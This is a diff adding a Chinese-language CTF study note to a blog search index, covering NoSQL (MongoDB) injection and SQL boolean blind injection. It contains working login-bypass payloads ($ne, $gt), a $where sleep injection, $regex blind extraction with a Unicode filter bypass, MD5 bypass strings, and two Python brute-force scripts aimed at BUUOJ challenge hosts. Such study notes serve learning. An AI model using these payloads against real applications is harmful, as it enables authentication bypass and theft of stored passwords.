@@ -10,4 +10,111 @@
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>NoSQL</title>
+    <url>/posts/f0940727/</url>
+    <content><![CDATA[<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><h3 id="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"><a href="#意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下" class="headerlink" title="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"></a>意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下</h3><h4 id="什么是NoSQL？"><a href="#什么是NoSQL？" class="headerlink" title="什么是NoSQL？"></a>什么是NoSQL？</h4><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
+<p>大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。<br>读这里详细了解MongoDB</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRWEDBn=QIIDRORYTD#toc-12">https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRWEDBn%3DQIIDRORYTD#toc-12</a></p>
+</blockquote>
+<h4 id="NoSQL-注入的分类"><a href="#NoSQL-注入的分类" class="headerlink" title="NoSQL 注入的分类"></a>NoSQL 注入的分类</h4><h5 id="有两种-NoSQL-注入分类的方式："><a href="#有两种-NoSQL-注入分类的方式：" class="headerlink" title="有两种 NoSQL 注入分类的方式："></a>有两种 NoSQL 注入分类的方式：</h5><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<pre><code>重言式注入
+</code></pre>
+<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<pre><code>联合查询注入
+</code></pre>
+<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<pre><code>JavaScript 注入
+</code></pre>
+<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<pre><code>盲注
+</code></pre>
+<p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+<p>常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL  </p>
+<h5 id="PHP-中的NoSQL注入"><a href="#PHP-中的NoSQL注入" class="headerlink" title="PHP 中的NoSQL注入"></a>PHP 中的NoSQL注入</h5><p>重言式注入：</p>
+<p>重言式注入通常也是判断是否为NoSQL的第一步。<br>我们需要用$ne关键字构造永真条件来完成NoSQL注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>
+<p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码<br>这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户</p>
+<p>所以我们也可以使用以下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=&amp;password[$ne]=</span><br><span class="line">username[$gt]=&amp;password[$gt]=</span><br><span class="line">username[$gte]=&amp;password[$gte]=</span><br></pre></td></tr></table></figure>
+<p>JavaScript注入：</p>
+<p>MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<p>要想使用JS注入，我们需要了解一下$where操作符。</p>
+<p>在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：</p>
+<blockquote>
+<p>db.users.find({ $where: “function(){return(this.username &#x3D;&#x3D; ‘whoami’)}” })<br>{ “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }</p>
+</blockquote>
+<p>由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
+<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</span><br></pre></td></tr></table></figure>
+<p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</span><br></pre></td></tr></table></figure>
+<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。<br>值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用<code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如<code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。<br>在MongoDB 2.4 之后<code>db</code>访问不到了，但还是可以构造万能密码查出用户信息</p>
+<p>布尔盲注：<br>当页面没有回显的时候可以使用$regex正则表达式来进行盲注，$regex可以达到和传统SQL注入中substr()函数相同的功能。</p>
+<p>和传统SQL注入一样，在已知用户名的情况下，我们需要知道密码长度。可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password[$regex]=.[4] (&quot;[]&quot;中的数字可以更改来确定密码长度，如果[4]为真，[5]为假，则密码为4位)  </span><br><span class="line">~~~  </span><br><span class="line">##### Node.js中的MongoDB注入  </span><br><span class="line">Node.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过</span><br><span class="line">另外，如果过滤了$ne关键字可以使用Unicode编码绕过。</span><br><span class="line">在这里贴一个布尔盲注用于爆密码的脚本</span><br></pre></td></tr></table></figure>
+<p>import requests<br>import string</p>
+<p>password &#x3D; ‘’<br>url &#x3D; ‘<a href="http://node4.buuoj.cn:27409/login.php">http://node4.buuoj.cn:27409/login.php</a>‘</p>
+<p>while True:<br>    for c in string.printable:<br>        if c not in [‘*’, ‘+’, ‘.’, ‘?’, ‘|’, ‘#’, ‘&amp;’, ‘$’]:</p>
+<pre><code>        # When the method is GET
+        get_payload = &#39;?username=admin&amp;password[$regex]=^%s&#39; % (password + c)
+        # When the method is POST
+        post_payload = &#123;
+            &quot;username&quot;: &quot;admin&quot;,
+            &quot;password[$regex]&quot;: &#39;^&#39; + password + c
+        &#125;
+        # When the method is POST with JSON
+        json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
+        headers = &#123;&#39;Content-Type&#39;: &#39;application/json&#39;&#125;
+        r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
+
+        #r = requests.post(url=url, data=post_payload)
+        if &#39;但没完全登录&#39; in r.content.decode():
+            print(&quot;[+] %s&quot; % (password + c))
+            password += c
+</code></pre>
+<h1 id="输出"><a href="#输出" class="headerlink" title="输出:"></a>输出:</h1><h1 id="4"><a href="#4" class="headerlink" title="[+] 4"></a>[+] 4</h1><h1 id="42"><a href="#42" class="headerlink" title="[+] 42"></a>[+] 42</h1><h1 id="422"><a href="#422" class="headerlink" title="[+] 422"></a>[+] 422</h1><h1 id="4227"><a href="#4227" class="headerlink" title="[+] 4227"></a>[+] 4227</h1><h1 id="42276"><a href="#42276" class="headerlink" title="[+] 42276"></a>[+] 42276</h1><h1 id="422766"><a href="#422766" class="headerlink" title="[+] 422766"></a>[+] 422766</h1><h1 id="……"><a href="#……" class="headerlink" title="……"></a>……</h1><h1 id="42276606202db06ad1f29ab6b4a1"><a href="#42276606202db06ad1f29ab6b4a1" class="headerlink" title="[+] 42276606202db06ad1f29ab6b4a1"></a>[+] 42276606202db06ad1f29ab6b4a1</h1><h1 id="42276606202db06ad1f29ab6b4a13"><a href="#42276606202db06ad1f29ab6b4a13" class="headerlink" title="[+] 42276606202db06ad1f29ab6b4a13"></a>[+] 42276606202db06ad1f29ab6b4a13</h1><h1 id="42276606202db06ad1f29ab6b4a130"><a href="#42276606202db06ad1f29ab6b4a130" class="headerlink" title="[+] 42276606202db06ad1f29ab6b4a130"></a>[+] 42276606202db06ad1f29ab6b4a130</h1><h1 id="42276606202db06ad1f29ab6b4a1307"><a href="#42276606202db06ad1f29ab6b4a1307" class="headerlink" title="[+] 42276606202db06ad1f29ab6b4a1307"></a>[+] 42276606202db06ad1f29ab6b4a1307</h1><h1 id="42276606202db06ad1f29ab6b4a1307f"><a href="#42276606202db06ad1f29ab6b4a1307f" class="headerlink" title="[+] 42276606202db06ad1f29ab6b4a1307f"></a>[+] 42276606202db06ad1f29ab6b4a1307f</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 关于Linux中的管道符 |</span><br><span class="line">管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下  </span><br><span class="line">使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入</span><br><span class="line">因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag</span><br><span class="line"># MD5</span><br><span class="line">MD5绕过真是五花八门，ffifdyop和129581926211651571912466741651878684928可用于SQL注入时语句经过MD5加密之后的绕过，其原理是：提交的字符串经过加密形成的16进制字符串转换成10进制数字后对应的asii表内容为：‘ or &#x27; 6......。  </span><br><span class="line">另外，数组绕过还可以绕过```if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))```</span><br><span class="line"># SQL布尔盲注  </span><br><span class="line">第一次在题目中遇到布尔盲注，所以在这里记录一下  </span><br><span class="line">题目：</span><br></pre></td></tr></table></figure>
+<p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我一开始怀疑是NoSQL（因为题目提示是SQL注入，PHP），结果尝试username[$ne]=1&amp;password[$ne]=1发现已经被过滤了。遂尝试普通的SQL注入  </span><br><span class="line">输入```1&#x27; or 1=1 --+```和```1;show databases();#```发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase） </span><br><span class="line">所以猜测这里需要布尔盲注，同时屏蔽了关键词  </span><br><span class="line">尝试Fuzz一下看看屏蔽了哪些关键词</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里粘贴一些用于Fuzz的字典<br><a href="https://github.com/Underwood12/FuzzDict">https://github.com/Underwood12/FuzzDict</a><br>这是Fuzz教程<br><a href="https://www.bilibili.com/video/BV1Zs42137tf">https://www.bilibili.com/video/BV1Zs42137tf</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目给库名和表名都是flag</span><br><span class="line">所以用```id=0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)```  </span><br><span class="line">来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f  </span><br><span class="line">然后使用脚本</span><br></pre></td></tr></table></figure>
+<p>import requests</p>
+<p>url &#x3D; “<a href="http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php">http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php</a>“</p>
+<p>result &#x3D; “”<br>num &#x3D; 0  # 用了来判断是不是flag已经拼完整了<br>for i in range(1, 60):</p>
+<pre><code>if num == 1:
+    break
+
+for j in range(32, 128):
+
+    payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j)
+    # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)
+
+    data = &#123;
+        &quot;id&quot;: payload,
+    &#125;
+
+    r = requests.post(url, data=data)
+
+    r.encoding = r.apparent_encoding
+
+    if &quot;Hello&quot; in r.text:
+        x = chr(j)
+        result += str(x)
+        print(result)
+        break
+
+    if &quot;&#125;&quot; in result:
+        print(result)
+        num = 1
+        break
+</code></pre>
+<pre><code>得到flag
+</code></pre>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
 </search>
